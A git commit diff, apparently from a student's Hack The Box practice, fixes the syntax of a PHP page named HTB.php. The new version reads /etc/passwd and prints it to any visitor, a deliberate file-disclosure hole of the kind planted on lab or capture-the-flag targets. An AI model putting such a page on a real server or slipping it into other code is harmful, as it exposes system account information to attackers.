f7ce7712c32ea0d6b006dbe2b412449187568884
PAVAN ALAPATI <2200031028@kluniversity.in>
2024-09-24 12:01:44 +0530

    HTB

--- HTB.php
+++ HTB.php
@@ -1,8 +1,12 @@
-< DOCTYPE html>
+<!DOCTYPE html>
 <html>
 <body>
-<h1>System Command Output:</hl>
-<?php
-header( location : file : ///etc/passwd i) ;
+    <h1>System Command Output:</h1>
+    <?php
+    // Display the contents of the /etc/passwd file (Not recommended for sensitive files)
+    echo "<pre>";
+    echo htmlspecialchars(file_get_contents("/etc/passwd"));
+    echo "</pre>";
+    ?>
 </body>
 </html>
